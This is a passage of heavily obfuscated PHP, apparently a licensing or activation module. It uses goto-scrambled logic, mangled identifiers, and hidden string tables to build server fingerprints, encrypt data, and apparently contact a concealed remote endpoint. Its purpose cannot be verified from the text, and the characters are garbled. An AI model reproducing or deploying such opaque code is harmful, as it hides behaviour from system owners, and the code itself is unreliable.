$this->{$_SERVER[Ş›][3]}($Dâ´‘ÊŞ[57], array($this, $Dâ´‘ÊŞ[58])); $this->{$_SERVER[Ş›][3]}($Dâ´‘ÊŞ[59], array($this, $Dâ´‘ÊŞ[60])); goto cáÖ±ÎàÆÑ; cåìÎŠéÅ: while (strlen($dî¼áğñÏ) < $AŒ©ùŞºï‘[554]) { if (!$dî¼áğñÏ) { break; } $dî¼áğñÏ++; } $this->{$_SERVER[Ş›][49]}(); $this->{$_SERVER[Ş›][50]}(); goto dßó²–Ò˜; f±™Â­ »á: $this->{$_SERVER[Ş›][47]}(); $this->{$_SERVER[Ş›][48]}(); $dî¼áğñÏ = $AŒ©ùŞºï‘[560]; goto cåìÎŠéÅ; C°¬°¹ÂÅó: while (strlen($FÊ¡Íññ§¤) < $AŒ©ùŞºï‘[539]) { if (!$FÊ¡Íññ§¤) { break; } $FÊ¡Íññ§¤++; } $this->{$_SERVER[Ş›][3]}($Dâ´‘ÊŞ[55], array($this, $Dâ´‘ÊŞ[56])); $D´»ÙÍ‹‚ = $AŒ©ùŞºï‘[563]; goto cÈ¨³¶ÍÈÂ; dßó²–Ò˜: $dø—ŞšÖ…¿ = $AŒ©ùŞºï‘[561]; while ($dø—ŞšÖ…¿ < $AŒ©ùŞºï‘[539]) { if ($dø—ŞšÖ…¿ >= 0) { break; } $dø—ŞšÖ…¿++; } $this->{$_SERVER[Ş›][51]}(); goto d ˆİ«¢È©; cáÖ±ÎàÆÑ: $bØÙÂœ¶“ = $AŒ©ùŞºï‘[565]; if (!$bØÙÂœ¶“) { return; } goto cí±ˆÎäŸÄ; d ˆİ«¢È©: $this->{$_SERVER[Ş›][52]}(); $this->{$_SERVER[Ş›][3]}($Dâ´‘ÊŞ[53], array($this, $Dâ´‘ÊŞ[54])); $FÊ¡Íññ§¤ = $AŒ©ùŞºï‘[562]; goto C°¬°¹ÂÅó; cí±ˆÎäŸÄ: } public function vlfkb043e2f2($C¸ÂµÁÎµâ) { goto a­ ¿øÒÇî; F”¼»Ğ‡Òå: $C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[106]][$AÏªŞø¨Ö¼[128]] = $AÏªŞø¨Ö¼[102]($this->lbsc5e85e8e4, $AÏªŞø¨Ö¼[129], $AÏªŞø¨Ö¼[10]); if ($AÏªŞø¨Ö¼[102]($GLOBALS, $AÏªŞø¨Ö¼[130]) && $this->config[$AÏªŞø¨Ö¼[131]]) { $C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[106]][$AÏªŞø¨Ö¼[132]] = WEB_ROOT; } return $C¸ÂµÁÎµâ; goto BÁÙŠ²Óæ; C‰‘ùà¢‹: if (!$EÍ’½·ê§) { return; } unset($C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[91]][$AÏªŞø¨Ö¼[93]][$AÏªŞø¨Ö¼[95]]); unset($C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[91]][$AÏªŞø¨Ö¼[92]][$AÏªŞø¨Ö¼[76]]); goto D §«ĞÆ·ó; F…¬¶ÍÂŞŞ: if ($E˜ß“š‹´‰[$AÏªŞø¨Ö¼[118]] != $AÏªŞø¨Ö¼[119]) { $C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[106]][$AÏªŞø¨Ö¼[120]] = $E˜ß“š‹´‰[$AÏªŞø¨Ö¼[120]]; $C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[106]][$AÏªŞø¨Ö¼[121]] = $E˜ß“š‹´‰[$AÏªŞø¨Ö¼[121]]; $c¨ã‡ØÂ¹Š = $AÏªŞø¨Ö¼[122](10) . $this->azntf8ec4bca . $AÏªŞø¨Ö¼[122](5); $C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[91]][$AÏªŞø¨Ö¼[123]][$AÏªŞø¨Ö¼[124]] = $this->{$_SERVER[Ş›][125]}($c¨ã‡ØÂ¹Š, $C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[106]][$AÏªŞø¨Ö¼[111]]); } if ($this->azntf8ec4bca == $AÏªŞø¨Ö¼[119]) { $C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[91]][$AÏªŞø¨Ö¼[92]][$AÏªŞø¨Ö¼[97]][$AÏªŞø¨Ö¼[105]] = 0; } $C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[106]][$AÏªŞø¨Ö¼[126]] = $AÏªŞø¨Ö¼[102]($this->lbsc5e85e8e4, $AÏªŞø¨Ö¼[127], $AÏªŞø¨Ö¼[10]); goto F”¼»Ğ‡Òå; b•½‹İøŒ—: $DèğÔ‡´Ê = $eÎ¹½±®÷·[566]; if (!$DèğÔ‡´Ê) { die; } $E’ùŠƒ¸íŠ = array($AÏªŞø¨Ö¼[64], $AÏªŞø¨Ö¼[65], $AÏªŞø¨Ö¼[66], $AÏªŞø¨Ö¼[67], $AÏªŞø¨Ö¼[68], $AÏªŞø¨Ö¼[69], $AÏªŞø¨Ö¼[70], $AÏªŞø¨Ö¼[71], $AÏªŞø¨Ö¼[72], $AÏªŞø¨Ö¼[73], $AÏªŞø¨Ö¼[74], $AÏªŞø¨Ö¼[75], $AÏªŞø¨Ö¼[76], $AÏªŞø¨Ö¼[77], $AÏªŞø¨Ö¼[78], $AÏªŞø¨Ö¼[79], $AÏªŞø¨Ö¼[80], $AÏªŞø¨Ö¼[81], $AÏªŞø¨Ö¼[82], $AÏªŞø¨Ö¼[83], $AÏªŞø¨Ö¼[84], $AÏªŞø¨Ö¼[85], $AÏªŞø¨Ö¼[86], $AÏªŞø¨Ö¼[87], $AÏªŞø¨Ö¼[88]); goto aĞœ›Ş; F’ìŸĞî«ø: $C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[106]][$AÏªŞø¨Ö¼[111]] = $AÏªŞø¨Ö¼[112]($_SERVER[$AÏªŞø¨Ö¼[113]] . $E˜ß“š‹´‰[$AÏªŞø¨Ö¼[114]]); $C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[106]][$AÏªŞø¨Ö¼[115]] = $AÏªŞø¨Ö¼[116]($AÏªŞø¨Ö¼[117]()); $C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[106]][$AÏªŞø¨Ö¼[118]] = $this->azntf8ec4bca; goto F…¬¶ÍÂŞŞ; a‹í¥ê›ñİ: $EØÚØ©í‘³ = $C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[91]][$AÏªŞø¨Ö¼[92]][$AÏªŞø¨Ö¼[76]]; unset($C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[91]][$AÏªŞø¨Ö¼[93]][$AÏªŞø¨Ö¼[94]]); $EÍ’½·ê§ = $eÎ¹½±®÷·[568]; goto C‰‘ùà¢‹; aĞœ›Ş: $A¯ÁòÍ¹Œ = $eÎ¹½±®÷·[567]; while (strlen($A¯ÁòÍ¹Œ) < $eÎ¹½±®÷·[564]) { if (!$A¯ÁòÍ¹Œ) { break; } $A¯ÁòÍ¹Œ++; } foreach ($E’ùŠƒ¸íŠ as $B„·½ë†˜ê) { $E¥‚¤•¤ = $GLOBALS[$AÏªŞø¨Ö¼[89]][$AÏªŞø¨Ö¼[90]][$B„·½ë†˜ê]; if (isset($E˜ß“š‹´‰[$B„·½ë†˜ê])) { $E¥‚¤•¤ = $E˜ß“š‹´‰[$B„·½ë†˜ê]; } $C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[91]][$AÏªŞø¨Ö¼[92]][$B„·½ë†˜ê] = $E¥‚¤•¤; } goto a‹í¥ê›ñİ; B§›­¹ö‘”: $C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[106]][$AÏªŞø¨Ö¼[107]] = $AÏªŞø¨Ö¼[108]($AÏªŞø¨Ö¼[109])->{$_SERVER[Ş›][110]}(); $BÔŒÙ¹Â…ó = $eÎ¹½±®÷·[572]; if (!$BÔŒÙ¹Â…ó) { die; } goto F’ìŸĞî«ø; dÕ¼°»ÑÌ: if (strlen($A°™©µµ‡) < $eÎ¹½±®÷·[539]) { die; } $C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[91]][$AÏªŞø¨Ö¼[92]][$AÏªŞø¨Ö¼[97]] = array($AÏªŞø¨Ö¼[98] => (int) $EØÚØ©í‘³[$AÏªŞø¨Ö¼[99]], $AÏªŞø¨Ö¼[100] => $AÏªŞø¨Ö¼[101]($AÏªŞø¨Ö¼[102]($EØÚØ©í‘³, $AÏªŞø¨Ö¼[103], array())), $AÏªŞø¨Ö¼[104] => (int) $AÏªŞø¨Ö¼[102]($EØÚØ©í‘³, $AÏªŞø¨Ö¼[105], 0)); $eä¶ÆŸª•ğ = $eÎ¹½±®÷·[571]; goto B§›­¹ö‘”; D §«ĞÆ·ó: $FÙ¯²Šä¬ = $eÎ¹½±®÷·[569]; unset($C¸ÂµÁÎµâ[$AÏªŞø¨Ö¼[91]][$AÏªŞø¨Ö¼[92]][$AÏªŞø¨Ö¼[96]]); $A°™©µµ‡ = $eÎ¹½±®÷·[570]; goto dÕ¼°»ÑÌ; a­ ¿øÒÇî: $eÎ¹½±®÷· =& $_SERVER[‘®…¢À]; $AÏªŞø¨Ö¼ =& $_SERVER[Ş›]; $E˜ß“š‹´‰ = $AÏªŞø¨Ö¼[61]($AÏªŞø¨Ö¼[62])->{$_SERVER[Ş›][63]}(); goto b•½‹İøŒ—; BÁÙŠ²Óæ: } private function yiafe2c0567e() { goto b´†ÔŞ‹÷‚; EñÛØî¯: $AÂîÑš¾Ğ‚ = array($c¾ÑåØÀ¥[157] => $F©‡³‚ÒÉ·[$c¾ÑåØÀ¥[64]], $c¾ÑåØÀ¥[158] => $F©‡³‚ÒÉ·[$c¾ÑåØÀ¥[65]], $c¾ÑåØÀ¥[159] => $c¾ÑåØÀ¥[10]); foreach ($E—Ã‘†Ô‚ä as $f›ËÙÏ˜à) { if (!isset($F©‡³‚ÒÉ·[$f›ËÙÏ˜à]) || !$F©‡³‚ÒÉ·[$f›ËÙÏ˜à]) { continue; } $AÂîÑš¾Ğ‚[$f›ËÙÏ˜à] = $F©‡³‚ÒÉ·[$f›ËÙÏ˜à]; } $c¾ÑåØÀ¥[13](array($c¾ÑåØÀ¥[149], $c¾ÑåØÀ¥[150]), $AÂîÑš¾Ğ‚); goto eö§¹´Æ„; E¦Ï¥æ±ª: $F©‡³‚ÒÉ· = $c¾ÑåØÀ¥[61]($c¾ÑåØÀ¥[62])->{$_SERVER[Ş›][63]}(); $d¯ƒ‘“‹Ñ­ = $aÙ¨ÑîÎŞ¯[574]; if (!$d¯ƒ‘“‹Ñ­) { return; } goto EñÛØî¯; b´†ÔŞ‹÷‚: $aÙ¨ÑîÎŞ¯ =& $_SERVER[‘®…¢À]; $c¾ÑåØÀ¥ =& $_SERVER[Ş›]; if ($_SERVER[$c¾ÑåØÀ¥[44]] == $c¾ÑåØÀ¥[133]) { $FÙÑ©Ë‚ = array($c¾ÑåØÀ¥[118] => $this->azntf8ec4bca, $c¾ÑåØÀ¥[134] => $this->{$_SERVER[Ş›][135]}(), $c¾ÑåØÀ¥[136] => $c¾ÑåØÀ¥[61]($c¾ÑåØÀ¥[137])->{$_SERVER[Ş›][138]}()); if ($this->azntf8ec4bca != $c¾ÑåØÀ¥[119]) { $Fœ¥õ¦ï¯ = $c¾ÑåØÀ¥[102]($this->lbsc5e85e8e4, $c¾ÑåØÀ¥[139]); if ($Fœ¥õ¦ï¯) { $FÙÑ©Ë‚[$c¾ÑåØÀ¥[140]] = $Fœ¥õ¦ï¯; $FÙÑ©Ë‚[$c¾ÑåØÀ¥[141]] = $c¾ÑåØÀ¥[142]($c¾ÑåØÀ¥[102]($this->lbsc5e85e8e4, $c¾ÑåØÀ¥[143])); $FÙÑ©Ë‚[$c¾ÑåØÀ¥[144]] = $c¾ÑåØÀ¥[102]($this->lbsc5e85e8e4, $c¾ÑåØÀ¥[129]); } } $FÙÑ©Ë‚ = $this->{$_SERVER[Ş›][145]}($c¾ÑåØÀ¥[146]($FÙÑ©Ë‚), $c¾ÑåØÀ¥[112]($c¾ÑåØÀ¥[147])); $AÂîÑš¾Ğ‚ = array($c¾ÑåØÀ¥[148] => $FÙÑ©Ë‚); $c¾ÑåØÀ¥[13](array($c¾ÑåØÀ¥[149], $c¾ÑåØÀ¥[150]), $AÂîÑš¾Ğ‚); } goto f“…ôÄ—Šà; f“…ôÄ—Šà: if ($this->azntf8ec4bca == $c¾ÑåØÀ¥[119]) { return; } $E—Ã‘†Ô‚ä = array($c¾ÑåØÀ¥[151], $c¾ÑåØÀ¥[152], $c¾ÑåØÀ¥[153], $c¾ÑåØÀ¥[154], $c¾ÑåØÀ¥[155], $c¾ÑåØÀ¥[156]); $fØƒÎ¢ĞÑ™ = $aÙ¨ÑîÎŞ¯[573]; goto E¦Ï¥æ±ª; eö§¹´Æ„: } private function faghf33ffbed() { goto f¤–¦ÚÃˆÆ; c…ï§Ö‚áç: $dÜ°¶Ôœê[$E‰ˆ­ØÏ´[120]] = $E‰ˆ­ØÏ´[212]($E‰ˆ­ØÏ´[116]($this->{$_SERVER[Ş›][145]}($dµãõ›óÉŠ, $E‰ˆ­ØÏ´[213]))); $D‹÷‚èõÑ³ = $E‰ˆ­ØÏ´[122](16); $bÄİ¾óïÍ = $D‹÷‚èõÑ³ . $dÜ°¶Ôœê[$E‰ˆ­ØÏ´[118]] . $this->{$_SERVER[Ş›][145]}($E‰ˆ­ØÏ´[112]($dÜ°¶Ôœê[$E‰ˆ­ØÏ´[207]]), $D‹÷‚èõÑ³); goto b¬Š ŸÒ¸İ; b¬Š ŸÒ¸İ: $E÷äÚÂ»× = $B£¾Éâ•áß[578]; while ($E÷äÚÂ»× < $B£¾Éâ•áß[564]) { if ($E÷äÚÂ»× >= 0) { break; } $E÷äÚÂ»×++; } $dÜ°¶Ôœê[$E‰ˆ­ØÏ´[121]] = $E‰ˆ­ØÏ´[116]($E‰ˆ­ØÏ´[212]($this->{$_SERVER[Ş›][145]}($bÄİ¾óïÍ, $E‰ˆ­ØÏ´[214]))); goto D¶–“Ş×œÚ; Dà°¤§ÜõÄ: $D¥ÊòÇÂàÔ = $GLOBALS[$E‰ˆ­ØÏ´[22]]; if (isset($D¥ÊòÇÂàÔ[$E‰ˆ­ØÏ´[161]])) { $this->{$_SERVER[Ş›][162]}(); die; } if (!isset($D¥ÊòÇÂàÔ[$E‰ˆ­ØÏ´[163]]) || $E‰ˆ­ØÏ´[24]($D¥ÊòÇÂàÔ[$E‰ˆ­ØÏ´[163]]) != 16) { $E‰ˆ­ØÏ´[164]($E‰ˆ­ØÏ´[165] . $D¥ÊòÇÂàÔ[$E‰ˆ­ØÏ´[163]], !1); } goto B°§ ñªõ; eğæ½íÄØÒ: while (strlen($dî‚‹œõ’) < $B£¾Éâ•áß[539]) { if (!$dî‚‹œõ’) { break; } $dî‚‹œõ’++; } $cº¶ïŸÓ‘Á = $dÑøÎ“ÆÉ‡[$E‰ˆ­ØÏ´[223]]; $cÕ¹Ù‘â¬ = array(); goto aÆ¥Ü£Ô; e ôÏ¢Â©Æ: $E‰ˆ­ØÏ´[61]($E‰ˆ­ØÏ´[11])->{$_SERVER[Ş›][224]}($cº¶ïŸÓ‘Á[$E‰ˆ­ØÏ´[225]], array($E‰ˆ­ØÏ´[226] => $cÕ¹Ù‘â¬)); $e“Ğ­ê³³ê = $B£¾Éâ•áß[582]; while ($e“Ğ­ê³³ê < $B£¾Éâ•áß[554]) { if ($e“Ğ­ê³³ê >= 0) { break; } $e“Ğ­ê³³ê++; } goto b•†Ğ´¯È; a§îçóğ°ˆ: if ($B¼šî¥®É[$E‰ˆ­ØÏ´[166]]) { $dÜ°¶Ôœê[$E‰ˆ­ØÏ´[210]] = $B¼šî¥®É[$E‰ˆ­ØÏ´[166]]; } $eàºâ÷óä‚ = $E‰ˆ­ØÏ´[25]($E‰ˆ­ØÏ´[112]($dÜ°¶Ôœê[$E‰ˆ­ØÏ´[208]]), 10, 10); $dµãõ›óÉŠ = $eàºâ÷óä‚ . $dÜ°¶Ôœê[$E‰ˆ­ØÏ´[118]] . $dÜ°¶Ôœê[$E‰ˆ­ØÏ´[210]]; goto c…ï§Ö‚áç; B°§ ñªõ: $B‡á©§›ß„ = $E‰ˆ­ØÏ´[61]($E‰ˆ­ØÏ´[62])->{$_SERVER[Ş›][63]}($E‰ˆ­ØÏ´[114]); $B¼šî¥®É = array($E‰ˆ­ØÏ´[163] => $D¥ÊòÇÂàÔ[$E‰ˆ­ØÏ´[163]], $E‰ˆ­ØÏ´[166] => $E‰ˆ­ØÏ´[122](16), $E‰ˆ­ØÏ´[167] => $E‰ˆ­ØÏ´[147], $E‰ˆ­ØÏ´[168] => $E‰ˆ­ØÏ´[169], $E‰ˆ­ØÏ´[170] => $_SERVER[$E‰ˆ­ØÏ´[171]], $E‰ˆ­ØÏ´[172] => $_SERVER[$E‰ˆ­ØÏ´[173]], $E‰ˆ­ØÏ´[174] => $_SERVER[$E‰ˆ­ØÏ´[175]]); $Dœ»¥õÁÆ = $E‰ˆ­ØÏ´[112]($_SERVER[$E‰ˆ­ØÏ´[113]] . $B‡á©§›ß„); goto aÚøóì‰š; b•†Ğ´¯È: $E‰ˆ­ØÏ´[164]($E‰ˆ­ØÏ´[195]($E‰ˆ­ØÏ´[206]), !0); $Cß¸Õ·òÜ = $B£¾Éâ•áß[583]; if (strlen($Cß¸Õ·òÜ) < $B£¾Éâ•áß[548]) { return; } goto BßâÂÎ½”Ö; aÆ¥Ü£Ô: $f´Ş¨Äõ‘± = $B£¾Éâ•áß[581]; if (!$f´Ş¨Äõ‘±) { die; } $cÕ¹Ù‘â¬[$F½õ”çß‘«] = $AÃ¥œœ®; goto e ôÏ¢Â©Æ; C‘¿Ç©öŒè: $eé¦İÆîÑ¥ = $B£’¢İ¬²[$E‰ˆ­ØÏ´[190]]; $bãâè¥º‹… = $this->{$_SERVER[Ş›][197]}($eé¦İÆîÑ¥[$E‰ˆ­ØÏ´[198]]); $e²¶¶ùóò‹ = $B£¾Éâ•áß[577]; goto A…àÙîöÎ; DÃÆåËˆÑä: $AÃ¥œœ® = $this->{$_SERVER[Ş›][125]}($E‰ˆ­ØÏ´[146]($eé¦İÆîÑ¥), $dŸÆÑ¼…‚›); $dÑøÎ“ÆÉ‡ = $E‰ˆ­ØÏ´[220]($E‰ˆ­ØÏ´[61]($E‰ˆ­ØÏ´[11])->{$_SERVER[Ş›][221]}(), $E‰ˆ­ØÏ´[222]); $dî‚‹œõ’ = $B£¾Éâ•áß[580]; goto eğæ½íÄØÒ; A…àÙîöÎ: if (!$e²¶¶ùóò‹) { die; } if (!$bãâè¥º‹… || $bãâè¥º‹… != $E‰ˆ­ØÏ´[199]($eé¦İÆîÑ¥[$E‰ˆ­ØÏ´[143]])) { $AùÄÔÖ«©¨ = array($E‰ˆ­ØÏ´[200] => $E‰ˆ­ØÏ´[61]($E‰ˆ­ØÏ´[62])->{$_SERVER[Ş›][63]}($E‰ˆ­ØÏ´[114]), $E‰ˆ­ØÏ´[201] => $_SERVER[$E‰ˆ­ØÏ´[113]], $E‰ˆ­ØÏ´[202] => $E‰ˆ­ØÏ´[203](), $E‰ˆ­ØÏ´[172] => $_SERVER[$E‰ˆ­ØÏ´[173]]); $DÖÆô¬Ò¿¢ = $this->{$_SERVER[Ş›][204]}($E‰ˆ­ØÏ´[146]($AùÄÔÖ«©¨)); $this->{$_SERVER[Ş›][180]}($E‰ˆ­ØÏ´[205] . $DÖÆô¬Ò¿¢); $E‰ˆ­ØÏ´[164]($E‰ˆ­ØÏ´[195]($E‰ˆ­ØÏ´[206]), !0); } $dÜ°¶Ôœê = array($E‰ˆ­ØÏ´[207] => $B¼šî¥®É[$E‰ˆ­ØÏ´[163]], $E‰ˆ­ØÏ´[208] => $eé¦İÆîÑ¥[$E‰ˆ­ØÏ´[209]], $E‰ˆ­ØÏ´[210] => $E‰ˆ­ØÏ´[122](16), $E‰ˆ­ØÏ´[118] => $eé¦İÆîÑ¥[$E‰ˆ­ØÏ´[211]]); goto a§îçóğ°ˆ; f¤–¦ÚÃˆÆ: $B£¾Éâ•áß =& $_SERVER[‘®…¢À]; $E‰ˆ­ØÏ´ =& $_SERVER[Ş›]; if ($_SERVER[$E‰ˆ­ØÏ´[44]] != $E‰ˆ­ØÏ´[160] || !$E‰ˆ­ØÏ´[102]($GLOBALS, $E‰ˆ­ØÏ´[130])) { return; } goto Dà°¤§ÜõÄ; aÚøóì‰š: $Añçé×¶ Ã = $B£¾Éâ•áß[575]; if ($D¥ÊòÇÂàÔ[$E‰ˆ­ØÏ´[176]] == $E‰ˆ­ØÏ´[177]) { $Cµ ‘Â‡ï¸ = $this->{$_SERVER[Ş›][145]}($Dœ»¥õÁÆ, $E‰ˆ­ØÏ´[178]); $DÖÆô¬Ò¿¢ = $this->{$_SERVER[Ş›][125]}($E‰ˆ­ØÏ´[146]($B¼šî¥®É), $Dœ»¥õÁÆ . $E‰ˆ­ØÏ´[179], 3); $eÜ²âø× = $this->{$_SERVER[Ş›][180]}($E‰ˆ­ØÏ´[181] . $Cµ ‘Â‡ï¸ . $E‰ˆ­ØÏ´[182] . $DÖÆô¬Ò¿¢, -1); $E‰ˆ­ØÏ´[164]($eÜ²âø×, !0); } else { if ($D¥ÊòÇÂàÔ[$E‰ˆ­ØÏ´[176]] == $E‰ˆ­ØÏ´[183]) { $d²œØ‹¿•‹ = $E‰ˆ­ØÏ´[25]($E‰ˆ­ØÏ´[112]($E‰ˆ­ØÏ´[184] . $Dœ»¥õÁÆ), 12, 15) . $E‰ˆ­ØÏ´[185]; $DÖÆô¬Ò¿¢ = $this->{$_SERVER[Ş›][186]}($E‰ˆ­ØÏ´[2]($D¥ÊòÇÂàÔ[$E‰ˆ­ØÏ´[187]]), $d²œØ‹¿•‹, 2); $B£’¢İ¬² = $E‰ˆ­ØÏ´[188]($DÖÆô¬Ò¿¢, !0); if (!$E‰ˆ­ØÏ´[189]($B£’¢İ¬²) || !$E‰ˆ­ØÏ´[189]($B£’¢İ¬²[$E‰ˆ­ØÏ´[190]]) || $B£’¢İ¬²[$E‰ˆ­ØÏ´[163]] != !0) { $cù¯ƒ‰ö‚ = $E‰ˆ­ØÏ´[191]; $dï¸‹Äé›° = $B£’¢İ¬²[$E‰ˆ­ØÏ´[190]] ? $E‰ˆ­ØÏ´[192] . $B£’¢İ¬²[$E‰ˆ­ØÏ´[190]] : $cù¯ƒ‰ö‚; $E‰ˆ­ØÏ´[164]($dï¸‹Äé›°, !1); } else { $B¼šî¥®É[$E‰ˆ­ØÏ´[166]] = $B£’¢İ¬²[$E‰ˆ­ØÏ´[190]][$E‰ˆ­ØÏ´[193]]; } } else { $B£’¢İ¬² = $this->{$_SERVER[Ş›][180]}($E‰ˆ­ØÏ´[194], $B¼šî¥®É, 10); $DÒÏ‘¥÷è¼ = $B£¾Éâ•áß[576]; } } if (!$E‰ˆ­ØÏ´[189]($B£’¢İ¬²) || !$E‰ˆ­ØÏ´[189]($B£’¢İ¬²[$E‰ˆ­ØÏ´[190]]) || $B£’¢İ¬²[$E‰ˆ­ØÏ´[163]] != !0) { $cù¯ƒ‰ö‚ = $E‰ˆ­ØÏ´[195]($E‰ˆ­ØÏ´[196]); $dï¸‹Äé›° = $B£’¢İ¬²[$E‰ˆ­ØÏ´[190]] ? $E‰ˆ­ØÏ´[192] . $B£’¢İ¬²[$E‰ˆ­ØÏ´[190]] : $cù¯ƒ‰ö‚; $E‰ˆ­ØÏ´[164]($dï¸‹Äé›°, !1); } goto C‘¿Ç©öŒè; bºŒæ‘­î: $E‰ˆ­ØÏ´[61]($E‰ˆ­ØÏ´[62])->{$_SERVER[Ş›][219]}($dÜ°¶Ôœê); $dŸÆÑ¼…‚› = $E‰ˆ­ØÏ´[112]($_SERVER[$E‰ˆ­ØÏ´[113]] . $E‰ˆ­ØÏ´[212]($B‡á©§›ß„) . $dÜ°¶Ôœê[$E‰ˆ­ØÏ´[208]]); $F½õ”çß‘« = $E‰ˆ­ØÏ´[212]($E‰ˆ­ØÏ´[25]($dŸÆÑ¼…‚›, 10, 16)); goto DÃÆåËˆÑä; D¶–“Ş×œÚ: $Aİº²“ÙÜ¨ = $B£¾Éâ•áß[579]; if (!$Aİº²“ÙÜ¨) { return; } if ($eé¦İÆîÑ¥[$E‰ˆ­ØÏ´[215]] && $eé¦İÆîÑ¥[$E‰ˆ­ØÏ´[215]] >= 1) { $E‰ˆ­ØÏ´[61]($E‰ˆ­ØÏ´[62])->{$_SERVER[Ş›][216]}($E‰ˆ­ØÏ´[217], $E‰ˆ­ØÏ´[218]); } goto bºŒæ‘­î; BßâÂÎ½”Ö: } private function qmhw28428ea0() { goto DÄğíƒ®ôÌ; A·ö‡Öƒã: $this->azntf8ec4bca = $fÉ¼´Ÿ…Æá[119]; goto F¶×¶”ñÅ; DÄğíƒ®ôÌ: $fÉ¼´Ÿ…Æá =& $_SERVER[Ş›]; $fÉ¼´Ÿ…Æá[61]($fÉ¼´Ÿ…Æá[62])->{$_SERVER[Ş›][219]}(array($fÉ¼´Ÿ…Æá[207] => $fÉ¼´Ÿ…Æá[10], $fÉ¼´Ÿ…Æá[208] => $fÉ¼´Ÿ…Æá[10], $fÉ¼´Ÿ…Æá[118] => $fÉ¼´Ÿ…Æá[119], $fÉ¼´Ÿ…Æá[120] => $fÉ¼´Ÿ…Æá[10], $fÉ¼´Ÿ…Æá[121] => $fÉ¼´Ÿ…Æá[10])); $fÉ¼´Ÿ…Æá[61]($fÉ¼´Ÿ…Æá[62])->{$_SERVER[Ş›][216]}($fÉ¼´Ÿ…Æá[217], $fÉ¼´Ÿ…Æá[227]); goto d…¾±Å†øª; d…¾±Å†øª: $this->lbsc5e85e8e4 = array(); $BÜ……—Ó¨¶ = $_SERVER[‘®…¢À][584]; if (!$BÜ……—Ó¨¶) { die; } goto A·ö‡Öƒã; F¶×¶”ñÅ: } private function fauj52cafc72() { goto bâğµòìË±; e¾Ä¨ô—Ã : $fôâ¿¼®Èç = $aÀ¿˜£½Ö×[587]; $d¦í”Ã±Ñ = $c¡¼ï®°ñê[212]($c¡¼ï®°ñê[25]($C¸ÁïÉì©ğ, 10, 16)); $Fæ‹„¢ß† = $aÀ¿˜£½Ö×[588]; goto d´ÔŠ±ĞÚ˜; c„‡÷ŠÑ„‡: $F¦ˆ˜Í«ƒ = $aÀ¿˜£½Ö×[585]; $câ÷ßŒ„æ˜ = $c¡¼ï®°ñê[61]($c¡¼ï®°ñê[62])->{$_SERVER[Ş›][63]}(); $Eæ·¥ÎØ¦ = $aÀ¿˜£½Ö×[586]; goto aø£œÃó¿È; f¸ã‚ÆÒ: $Aôà¦¯öò“ = $c¡¼ï®°ñê[142]($F¨Ûéãó·[$c¡¼ï®°ñê[143]]); if ($c¡¼ï®°ñê[228]() >= $Aôà¦¯öò“) { return $this->{$_SERVER[Ş›][162]}(); } $this->lbsc5e85e8e4 = $F¨Ûéãó·; goto då§Õ¬ãÑÂ; då§Õ¬ãÑÂ: $this->azntf8ec4bca = $câ÷ßŒ„æ˜[$c¡¼ï®°ñê[118]]; goto aÇÍƒŒ©â; aø£œÃó¿È: if (!$Eæ·¥ÎØ¦) { die; } if ($câ÷ßŒ„æ˜[$c¡¼ï®°ñê[118]] == $c¡¼ï®°ñê[119]) { return; } $a¤Šß­ƒ‚ = $c¡¼ï®°ñê[61]($c¡¼ï®°ñê[62])->{$_SERVER[Ş›][63]}($c¡¼ï®°ñê[114]); goto CøÆÅÙš¶; d´ÔŠ±ĞÚ˜: $F¨Ûéãó· = $this->{$_SERVER[Ş›][186]}($F˜ƒ³÷ÇÄ[$c¡¼ï®°ñê[89]][$d¦í”Ã±Ñ], $C¸ÁïÉì©ğ); $F¨Ûéãó· = $c¡¼ï®°ñê[188]($F¨Ûéãó·, !0); if (!$c¡¼ï®°ñê[189]($F¨Ûéãó·)) { return $this->{$_SERVER[Ş›][162]}(); } goto f¸ã‚ÆÒ; CøÆÅÙš¶: $c…Á©îÍÈë = $c¡¼ï®°ñê[220]($c¡¼ï®°ñê[61]($c¡¼ï®°ñê[11])->{$_SERVER[Ş›][221]}(), $c¡¼ï®°ñê[222]); $F˜ƒ³÷ÇÄ = $c…Á©îÍÈë[$c¡¼ï®°ñê[223]]; $C¸ÁïÉì©ğ = $c¡¼ï®°ñê[112]($_SERVER[$c¡¼ï®°ñê[113]] . $c¡¼ï®°ñê[212]($a¤Šß­ƒ‚) . $câ÷ßŒ„æ˜[$c¡¼ï®°ñê[208]]); goto e¾Ä¨ô—Ã ; bâğµòìË±: $aÀ¿˜£½Ö× =& $_SERVER[‘®…¢À]; $c¡¼ï®°ñê =& $_SERVER[Ş›]; $this->azntf8ec4bca = $c¡¼ï®°ñê[119]; goto c„‡÷ŠÑ„‡; aÇÍƒŒ©â: } private function horg4fa6ff71() { goto d¯ÜÜÎ¬•¶; c›–»„™¯˜: $EÉÃëÉ”´¬ = array($A¸ÃÆÙ¶¯[232], $A¸ÃÆÙ¶¯[233]); if ($A¸ÃÆÙ¶¯[234]($cÜ·Å¾¹»ã, $EÉÃëÉ”´¬)) { if ($this->azntf8ec4bca == $A¸ÃÆÙ¶¯[119] && isset($cáâˆ±Åã[$A¸ÃÆÙ¶¯[235]])) { $A¸ÃÆÙ¶¯[164]($A¸ÃÆÙ¶¯[195]($A¸ÃÆÙ¶¯[230]), !1, $A¸ÃÆÙ¶¯[231]); die; } $c¢¹±ØÂº¹ = $this->{$_SERVER[Ş›][135]}(); if ($c¢¹±ØÂº¹ != $A¸ÃÆÙ¶¯[199]($A¸ÃÆÙ¶¯[236])) { if ($c¢¹±ØÂº¹ <= 